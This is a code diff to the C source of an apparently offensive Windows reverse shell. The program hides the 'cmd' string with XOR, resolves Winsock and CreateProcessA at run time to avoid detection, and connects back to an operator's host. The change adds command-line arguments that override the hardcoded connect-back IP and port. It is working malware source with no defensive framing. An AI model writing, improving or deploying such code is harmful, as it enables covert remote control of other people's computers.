@@ -31,7 +31,7 @@ typedef u_short (WSAAPI *lpHtons)(u_short);
 typedef BOOL (WINAPI *lpCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef void (WINAPI *lpSleep)(DWORD);
 
-int main(void) {
+int main(int argc, char *argv[]) {
     // Obfuscated "cmd" string (XORed with 0x5A)
     char cmd_str[] = {0x39, 0x37, 0x3E, 0x00}; 
     
@@ -64,7 +64,15 @@ int main(void) {
     if (!pWSAStartup || !pWSASocketA || !pConnect || !pCreateProcessA) return 1;
 
     // Logic
-	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
+    char *target_ip = CLIENT_IP;
+    int target_port = CLIENT_PORT;
+
+    if (argc == 3) {
+        target_ip = argv[1];
+        target_port = atoi(argv[2]);
+    }
+
+	if (strcmp(target_ip, "0.0.0.0") == 0 || target_port == 0) {
 		return (1);
 	}
 
@@ -76,8 +84,8 @@ int main(void) {
 	struct sockaddr_in sa;
 	SOCKET sockt = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 	sa.sin_family = AF_INET;
-	sa.sin_port = pHtons(CLIENT_PORT);
-	sa.sin_addr.s_addr = pInet_addr(CLIENT_IP);
+	sa.sin_port = pHtons(target_port);
+	sa.sin_addr.s_addr = pInet_addr(target_ip);
 
 #ifdef WAIT_FOR_CLIENT
 	while (pConnect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
